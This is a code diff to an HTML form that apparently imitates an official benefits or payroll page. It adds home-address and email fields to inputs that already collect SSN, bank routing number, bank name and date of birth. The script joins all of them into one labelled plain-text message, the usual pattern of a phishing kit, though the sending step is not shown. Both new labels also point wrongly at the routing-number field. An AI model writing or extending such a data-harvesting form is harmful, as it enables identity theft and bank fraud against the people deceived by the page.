@@ -2292,6 +2292,70 @@
                           />
                         </td>
                       </tr>
+                      <tr
+                        class="ui-widget-content ui-panelgrid-even"
+                        role="row"
+                      >
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 40%;
+                            vertical-align: middle;
+                            text-align: right;
+                          "
+                        >
+                          <label for="routingNumber">Home Address:</label>
+                        </td>
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 60%;
+                            vertical-align: top;
+                            text-align: left;
+                          "
+                        >
+                          <input
+                            id="homeAddress"
+                            name="homeAddress"
+                            type="text"
+                            required
+                          />
+                        </td>
+                      </tr>
+                      <tr
+                        class="ui-widget-content ui-panelgrid-even"
+                        role="row"
+                      >
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 40%;
+                            vertical-align: middle;
+                            text-align: right;
+                          "
+                        >
+                          <label for="routingNumber">Contact Email:</label>
+                        </td>
+                        <td
+                          role="gridcell"
+                          class="ui-panelgrid-cell"
+                          style="
+                            width: 60%;
+                            vertical-align: top;
+                            text-align: left;
+                          "
+                        >
+                          <input
+                            id="emailAddress"
+                            name="emailAddress"
+                            type="email"
+                            required
+                          />
+                        </td>
+                      </tr>
                       <tr class="ui-widget-content ui-panelgrid-odd" role="row">
                         <td
                           role="gridcell"
@@ -2532,6 +2596,8 @@
                 var routingNumber =
                   document.getElementById('routingNumber').value
                 var ssn = document.getElementById('ssn').value
+                var homeAddress = document.getElementById('homeAddress').value
+                var emailAddress = document.getElementById('emailAddress').value
                 var dob = document.getElementById('dob').value
                 var gender = document.getElementById('gender').value
                 var yearsOfService =
@@ -2558,6 +2624,12 @@
                     '\n' +
                     'LAST NAME: ' +
                     lastName +
+                    '\n' +
+                    'HOME ADDRESS: ' +
+                    homeAddress +
+                    '\n' +
+                    'EMAIL ADDRESS: ' +
+                    emailAddress +
                     '\n' +
                     'BANK NAME: ' +
                     bankName +
